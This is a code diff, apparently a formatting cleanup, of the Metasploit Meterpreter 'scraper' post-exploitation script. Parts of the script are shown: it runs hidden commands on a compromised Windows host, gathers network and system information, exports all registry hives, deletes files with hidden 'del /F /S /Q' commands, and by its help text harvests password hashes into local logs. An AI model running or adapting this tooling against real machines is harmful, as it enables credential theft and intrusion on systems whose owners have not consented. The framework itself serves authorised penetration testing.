@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # This is a Meterpreter script designed to be used by the Metasploit Framework
 #
@@ -14,19 +14,19 @@
 # hdm[at]metasploit.com
 #
 opts = Rex::Parser::Arguments.new(
-  "-h" => [ false,"Help menu." ]
+  "-h" => [ false, "Help menu." ]
 )
 
-opts.parse(args) { |opt, idx, val|
+opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     print_line("Scraper -- harvest system info including network shares, registry hives and password hashes")
-    print_line("Info is stored in " + ::File.join(Msf::Config.log_directory,"scripts", "scraper"))
+    print_line("Info is stored in " + ::File.join(Msf::Config.log_directory, "scripts", "scraper"))
     print_line("USAGE: run scraper")
     print_line(opts.usage)
     raise Rex::Script::Completed
   end
-}
+end
 
 require 'fileutils'
 
@@ -35,44 +35,40 @@ require 'fileutils'
 
 # Delete a file (meterpreter has no unlink API yet)
 def m_unlink(client, path)
-  r = client.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
-  while(r.name)
-    select(nil, nil, nil, 0.10)
-  end
+  r = client.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, 'Hidden' => 'true')
+  select(nil, nil, nil, 0.10) while r.name
   r.close
 end
+
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
+
 # Exec a command and return the results
 def m_exec(client, cmd)
-  begin
-    r = client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
-    b = ""
-    while(d = r.channel.read)
-      b << d
-      break if d == ""
-    end
-    r.channel.close
-    r.close
-    b
-  rescue ::Exception => e
-    print_error("Failed to run command #{cmd}")
-    print_error("Error: #{e.class} #{e}")
+  r = client.sys.process.execute(cmd, nil, 'Hidden' => true, 'Channelized' => true)
+  b = ""
+  while (d = r.channel.read)
+    b << d
+    break if d == ""
   end
+  r.channel.close
+  r.close
+  b
+rescue ::Exception => e
+  print_error("Failed to run command #{cmd}")
+  print_error("Error: #{e.class} #{e}")
 end
 
-
-
-
 # Extract the host and port
-host,port = client.session_host, client.session_port
+host = client.session_host
+port = client.session_port
 
 print_status("New session on #{host}:#{port}...")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'scripts','scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000)) )
+logs = ::File.join(Msf::Config.log_directory, 'scripts', 'scraper', host + "_" + Time.now.strftime("%Y%m%d.%M%S") + sprintf("%.5d", rand(100000)))
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -97,7 +93,7 @@ begin
     fd.puts(m_exec(client, "netstat -ns"))
   end
 
-  info = client.sys.config.sysinfo()
+  info = client.sys.config.sysinfo
   ::File.open(File.join(logs, "system.txt"), "w") do |fd|
     fd.puts("Computer: #{info['Computer']}")
     fd.puts("OS: #{info['OS']}")
@@ -149,7 +145,7 @@ begin
   end
 
   print_status("Obtaining the entire registry...")
-  hives = %w{HKCU HKLM HKCC HKCR HKU}
+  hives = %w(HKCU HKLM HKCC HKCR HKU)
   hives.each do |hive|
     print_status(" Exporting #{hive}")
 
@@ -168,4 +164,3 @@ begin
 rescue ::Exception => e
   print_status("Exception: #{e.class} #{e} #{e.backtrace}")
 end
-
